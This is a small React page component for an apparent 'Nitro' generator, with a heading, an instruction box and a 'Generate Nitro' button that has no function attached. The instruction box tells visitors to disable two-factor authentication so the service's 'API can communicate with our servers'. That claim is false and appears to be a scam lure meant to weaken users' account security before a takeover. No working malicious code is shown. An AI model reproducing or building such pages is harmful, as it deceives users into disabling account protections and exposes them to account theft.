export default function Page() {
	let code1 = Math.floor(Math.random()*16777215).toString(16);

    return (
        <>
		<div className="bg-gray-800/50 border border-white/5 p-10 m-12 rounded-lg grid place-items-center">
			<h1 className="text-6xl font-bold">
				Generator
			</h1>
		</div>
        <div className="bg-gray-800/50 border border-white/5 p-10 m-12 rounded-lg grid place-items-center">
			<h5 className="text-2xl font-light">
				Important step: if you have 2FA enabled on your account, disable it. This makes it so the API can communicate with our servers. You can turn it back on after.
			</h5>
            <button className="p-3 mt-2 bg-black/30 text-2xl rounded-2xl shadow-md hover:shadow-xl hover:bg-[#2e70db] transition-all duration-200">
				Generate Nitro
			</button>
		</div>
		<div className="bg-gray-800/50 border border-white/5 p-10 m-12 rounded-lg grid place-items-center" id="inputs">
			
		</div>
        </>
    )
}
